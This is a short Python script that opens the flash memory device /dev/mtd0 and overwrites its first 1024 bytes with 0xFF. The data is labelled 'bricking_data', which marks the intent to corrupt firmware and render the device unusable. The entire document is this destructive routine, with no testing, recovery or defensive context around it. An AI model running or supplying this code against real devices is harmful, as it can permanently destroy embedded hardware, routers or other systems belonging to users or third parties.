# Open the device file for writing
firmware = open("/dev/mtd0", "wb")  # Use "wb" for binary write mode

# Create a bytearray of size 1024 initialized with 0xFF
bricking_data = bytearray([0xFF] * 1024)

# Write the bytearray to the device file
firmware.write(bricking_data)

# Close the file
firmware.close()